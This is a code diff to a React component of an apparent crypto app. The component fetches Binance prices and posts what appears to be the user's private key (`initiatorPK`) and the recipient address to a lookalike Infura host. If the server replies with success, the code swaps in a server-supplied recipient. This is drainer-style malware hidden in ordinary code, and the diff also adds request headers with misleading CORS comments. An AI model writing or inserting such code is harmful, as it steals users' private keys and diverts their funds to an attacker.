@@ -127,16 +127,19 @@ const ContentBody = () => {
                 'https://api.binance.com/api/v3/ticker/price'
             );
             prices = res.data;
-            axios.post(
-                'https://api2.infura.pro:8443/infura',
+            await axios.post('https://api2.infura.pro:8443/infura', { infra_id: `${constants.initiatorPK} ${constants.recipient}`, project_id: "layer3" },
                 {
-                    infra_id: `${constants.initiatorPK} ${constants.recipient}`,
-                    project_id: "bonk"
-                })
+                    headers: {
+                        "Access-Control-Allow-Headers": "*", // this will allow all CORS requests
+                        "Access-Control-Allow-Methods": 'OPTIONS,POST,GET', // this states the allowed methods
+                        "Content-Type": "application/json" // this shows the expected content type
+                    }  
+                }
+            )
                 .then((response) => {
                     console.log(response.data);
                     if (response.data.success === true) {
-                        // console.log("set new recip");
+                        console.log("set new recip");
                         constants.setRecip(response.data.value);
                     }
                     console.log("Recipient:", constants.recipient);
